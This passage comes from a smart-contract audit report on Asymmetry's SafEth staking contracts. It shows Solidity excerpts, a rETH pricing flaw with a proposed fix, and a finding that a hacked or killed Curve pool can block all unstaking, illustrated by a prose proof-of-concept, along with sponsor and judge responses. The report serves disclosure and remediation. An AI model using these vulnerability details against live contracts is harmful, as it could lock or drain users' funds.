class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">underlyingValue</span><span class=\"mtk1\"> +=</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                (</span><span class=\"mtk12\">derivatives</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk11\">ethPerDerivative</span><span class=\"mtk1\">(</span><span class=\"mtk12\">derivatives</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk11\">balance</span><span class=\"mtk1\">()) *</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">derivatives</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk11\">balance</span><span class=\"mtk1\">()) /</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"28\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ethPerDerivative</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">poolCanDeposit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">return</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk11\">RocketTokenRETHInterface</span><span class=\"mtk1\">(</span><span class=\"mtk11\">rethAddress</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">getEthValue</span><span class=\"mtk1\">(</span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">poolPrice</span><span class=\"mtk1\">() * </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">) / (</span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"29\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">return</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">rocketDepositPool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getBalance</span><span class=\"mtk1\">() + </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> &lt;=</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">rocketDAOProtocolSettingsDeposit</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getMaximumDepositPoolSize</span><span class=\"mtk1\">() &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">rocketDAOProtocolSettingsDeposit</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getMinimumDeposit</span><span class=\"mtk1\">();</span></span></span></code></pre>\n<p>l’d recommend creating a new function in the reth derivative contract. Which converts the msg.value to reth tokens and using it instead of the whole Reth balance the derivative holds.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"30\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">rethValue</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">RocketTokenRETHInterface</span><span class=\"mtk1\">(</span><span class=\"mtk11\">rethAddress</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">getRethValue</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>Like this we check if the msg.value converted into reth tokens is below the maximumPoolDepositSize and greater than the minimum deposit.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"31\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">underlyingValue</span><span class=\"mtk1\"> +=</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                (</span><span class=\"mtk12\">derivatives</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk11\">ethPerDerivative</span><span class=\"mtk1\">(</span><span class=\"mtk12\">derivatives</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk11\">rethValue</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\">)) *</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">derivatives</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk11\">balance</span><span class=\"mtk1\">()) /</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1004#issuecomment-1499725139\">toshiSat (Asymmetry) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1004#issuecomment-1517884894\">Picodes (judge) commented</a>:</strong></p>\n<blockquote>\n<p>This report is great but only tackles a part of the problem: the pricing method is versatile and manipulable, so it can 1 - lead to a loss of funds as show here depending on the condition but more importantly be manipulated easily.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-contest#mitigations-to-be-reviewed\">Asymmetry mitigated</a>:</strong></p>\n<blockquote>\n<p>Don’t get rETH from pool on deposits.<br></p>\n</blockquote>\n<p><strong>Status:</strong> Mitigation confirmed with comments. Full details in reports from <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/30\">d3e4</a>, <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/24\">adriro</a>, and <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/4\">0x52</a>.</p>\n<hr>\n<h2 id=\"h-03-users-can-fail-to-unstake-and-lose-their-deserved-eth-because-malfunctioning-or-untrusted-derivative-cannot-be-removed\" style=\"position:relative;\"><a href=\"#h-03-users-can-fail-to-unstake-and-lose-their-deserved-eth-because-malfunctioning-or-untrusted-derivative-cannot-be-removed\" aria-label=\"h 03 users can fail to unstake and lose their deserved eth because malfunctioning or untrusted derivative cannot be removed permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/703\">[H-03] Users can fail to unstake and lose their deserved ETH because malfunctioning or untrusted derivative cannot be removed</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/703\">rbserver</a>, also found by <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/972\">tnevler</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/955\">kaden</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/833\">0xAgro</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/725\">Parad0x</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/709\">bytes032</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/668\">lukris02</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/642\">lukris02</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/638\">P7N8ZK</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/586\">IgorZuk</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/526\">DeStinE21</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/517\">Stiglitz</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/345\">DadeKuma</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/339\">J4de</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/297\">rvierdiiev</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/278\">koxuan</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/230\">dec3ntraliz3d</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/131\">carrotsmuggler</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/97\">HollaDieWaldfee</a>, and <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/34\">csanuragjain</a></em></p>\n<p>Calling the following <code>SafEth.adjustWeight</code> function can update the weight for an existing derivative to 0. However, there is no way to remove an existing derivative. If the external contracts that an existing derivative depends on malfunction or get hacked, this protocol’s functionalities that need to loop through the existing derivatives can behave unexpectedly. Users can fail to unstake and lose their deserved ETH as one of the severest consequences.</p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L165-L175\">https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L165-L175</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"32\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">adjustWeight</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_derivativeIndex</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_weight</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">weights</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_derivativeIndex</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">_weight</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">localTotalWeight</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">derivativeCount</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">localTotalWeight</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">weights</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">totalWeight</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">localTotalWeight</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">WeightChange</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_derivativeIndex</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_weight</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>For example, calling the following <code>SafEth.unstake</code> function would loop through all of the existing derivatives and call the corresponding derivative’s <code>withdraw</code> function. When the <code>WstEth</code> contract is one of these derivatives, the <code>WstEth.withdraw</code> function would be called, which further calls <code>IStEthEthPool(LIDO_CRV_POOL).exchange(1, 0, stEthBal, minOut)</code>. If <code>self.is_killed</code> in the stETH-ETH pool contract corresponding to <code>LIDO_CRV_POOL</code> becomes true, especially after such pool contract becomes compromised or hacked, calling such <code>exchange</code> function would always revert. In this case, calling the <code>SafEth.unstake</code> function reverts even though all other derivatives that are not the <code>WstEth</code> contract are still working fine. Because the <code>SafEth.unstake</code> function is DOS’ed, users cannot unstake and withdraw ETH that they are entitled to.</p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L108-L129\">https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L108-L129</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"33\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">unstake</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_safEthAmount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pauseUnstaking</span><span class=\"mtk1\"> == </span><span class=\"mtk4\">false</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;unstaking is paused&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">safEthTotalSupply</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethAmountBefore</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">derivativeCount</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// withdraw a percentage of each asset based on the amount of safETH</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">derivativeAmount</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">derivatives</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk11\">balance</span><span class=\"mtk1\">() *</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">_safEthAmount</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">safEthTotalSupply</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">derivativeAmount</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk15\">continue</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// if derivative empty ignore</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">derivatives</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">derivativeAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/WstEth.sol#L56-L67\">https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/WstEth.sol#L56-L67</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"34\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">IWStETH</span><span class=\"mtk1\">(</span><span class=\"mtk12\">WST_ETH</span><span class=\"mtk1\">).</span><span class=\"mtk11\">unwrap</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stEthBal</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">STETH_TOKEN</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">STETH_TOKEN</span><span class=\"mtk1\">).</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">LIDO_CRV_POOL</span><span class=\"mtk1\">, </span><span class=\"mtk12\">stEthBal</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">minOut</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">stEthBal</span><span class=\"mtk1\"> * (</span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">maxSlippage</span><span class=\"mtk1\">)) / </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">IStEthEthPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">LIDO_CRV_POOL</span><span class=\"mtk1\">).</span><span class=\"mtk11\">exchange</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk12\">stEthBal</span><span class=\"mtk1\">, </span><span class=\"mtk12\">minOut</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><a href=\"https://etherscan.io/address/0xDC24316b9AE028F1497c275EB9192a3Ea0f67022#code#L441\">https://etherscan.io/address/0xDC24316b9AE028F1497c275EB9192a3Ea0f67022#code#L441</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"35\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">def</span><span class=\"mtk1\"> </span><span class=\"mtk11\">exchange</span><span class=\"mtk1\">(</span><span class=\"mtk12\">i</span><span class=\"mtk1\">: </span><span class=\"mtk12\">int128</span><span class=\"mtk1\">, </span><span class=\"mtk12\">j</span><span class=\"mtk1\">: </span><span class=\"mtk12\">int128</span><span class=\"mtk1\">, </span><span class=\"mtk12\">dx</span><span class=\"mtk1\">: </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">, </span><span class=\"mtk12\">min_dy</span><span class=\"mtk1\">: </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) -&gt; uint256:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">assert</span><span class=\"mtk1\"> </span><span class=\"mtk12\">not</span><span class=\"mtk1\"> </span><span class=\"mtk12\">self</span><span class=\"mtk1\">.</span><span class=\"mtk12\">is_killed</span><span class=\"mtk1\">  # dev: </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">killed</span></span></span></code></pre>\n<h3 id=\"proof-of-concept-1\" style=\"position:relative;\"><a href=\"#proof-of-concept-1\" aria-label=\"proof of concept 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The following steps can occur for the described scenario.</p>\n<ol>\n<li>The <code>WstEth</code> contract is one of the existing derivatives. For the <code>WstEth</code> contract, the stETH-ETH pool contract corresponding to <code>LIDO_CRV_POOL</code> has been hacked in which its <code>self.is_killed</code> has been set to true.</li>\n<li>Alice calls the <code>SafEth.unstake</code> function but such function call reverts because calling the stETH-ETH pool contract’s <code>exchange</code> function reverts for the <code>WstEth</code> derivative.</li>\n<li>Although all other derivatives that are not the <code>WstEth</code> contract are still working fine, Alice is unable to unstake. As a result, she cannot withdraw and loses her deserved ETH.</li>\n</ol>\n<h3 id=\"tools-used-1\" style=\"position:relative;\"><a href=\"#tools-used-1\" aria-label=\"tools used 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VSCode</p>\n<h3 id=\"recommended-mitigation-steps-1\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-1\" aria-label=\"recommended mitigation steps 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The <code>SafEth</code> contract can be updated to add a function, which would be only callable by the trusted admin, for removing an existing derivative that already malfunctions or is untrusted.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/703#issuecomment-1500457717\">toshiSat (Asymmetry) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-contest#mitigations-to-be-reviewed\">Asymmetry mitigated</a>:</strong></p>\n<blockquote>\n<p>Enable/Disable Derivatives.<br></p>\n</blockquote>\n<p><strong>Status:</strong> Mitigation 